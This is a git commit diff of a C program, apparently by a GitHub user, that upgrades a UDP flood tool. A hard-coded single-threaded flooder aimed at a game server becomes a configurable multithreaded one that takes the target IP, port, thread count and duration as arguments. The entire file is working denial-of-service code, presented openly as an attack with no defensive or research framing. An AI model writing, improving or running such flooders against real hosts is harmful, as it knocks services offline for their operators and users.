e867781ad5f5f4e47e4c0edf34b3b4f58d496741
Ishan Keshav <109731292+ishan7369@users.noreply.github.com>
2025-03-14 11:02:29 +0530

    Update a.c

--- a.c
+++ a.c
@@ -1,33 +1,60 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <pthread.h>
 #include <arpa/inet.h>
 #include <unistd.h>
+#include <time.h>
 
-#define PACKET_SIZE 65507  // Max UDP payload size
+#define PACKET_SIZE 1024
 
-int main() {
+typedef struct {
+    struct sockaddr_in server;
+    time_t end_time;
+} ThreadArgs;
+
+void* udp_flood(void* arg) {
+    ThreadArgs* args = (ThreadArgs*)arg;
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-    if (sock < 0) {
-        perror("Socket creation failed");
+    char payload[PACKET_SIZE];
+    memset(payload, 'A', PACKET_SIZE);
+
+    while (time(NULL) < args->end_time) {
+        sendto(sock, payload, PACKET_SIZE, 0, (struct sockaddr*)&args->server, sizeof(args->server));
+    }
+
+    close(sock);
+    return NULL;
+}
+
+int main(int argc, char* argv[]) {
+    if (argc != 5) {
+        printf("Usage: %s <IP> <Port> <Threads> <Time (seconds)>\n", argv[0]);
         return 1;
     }
 
     struct sockaddr_in server;
     server.sin_family = AF_INET;
-    server.sin_port = htons(27015);  // Replace with your game server port
-    server.sin_addr.s_addr = inet_addr("192.168.1.10");  // Replace with your game server IP
+    server.sin_port = htons(atoi(argv[2]));
+    inet_pton(AF_INET, argv[1], &server.sin_addr);
 
-    char *packet = malloc(PACKET_SIZE);
-    memset(packet, 'A', PACKET_SIZE);  // Random payload
+    int threads = atoi(argv[3]);
+    int duration = atoi(argv[4]);
+    time_t end_time = time(NULL) + duration;
 
-    printf("Starting UDP flood attack...\n");
-    
-    while (1) {
-        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr*)&server, sizeof(server));
+    printf("Starting UDP flood on %s:%d for %d seconds using %d threads.\n", argv[1], atoi(argv[2]), duration, threads);
+
+    pthread_t thread_pool[threads];
+    ThreadArgs args = {server, end_time};
+
+    for (int i = 0; i < threads; i++) {
+        pthread_create(&thread_pool[i], NULL, udp_flood, &args);
     }
 
-    free(packet);
-    close(sock);
+    for (int i = 0; i < threads; i++) {
+        pthread_join(thread_pool[i], NULL);
+    }
+
+    printf("UDP flood completed.\n");
     return 0;
 }
